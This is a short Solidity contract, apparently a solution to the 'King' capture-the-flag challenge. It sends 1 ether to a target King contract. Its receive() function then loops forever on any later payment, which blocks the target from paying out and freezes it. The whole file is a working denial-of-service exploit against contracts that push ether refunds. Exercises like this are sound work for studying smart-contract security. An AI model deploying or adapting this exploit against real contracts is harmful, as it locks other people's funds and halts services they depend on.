// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        (bool s1, ) = contractAddress.call{ value: 1 ether }("");
        require(s1);
    }

    uint calls = 0;
    receive() external payable {
        if (calls == 0) calls++;
        else {
           while (true) {
                calls++;
            }
        }
    }
}
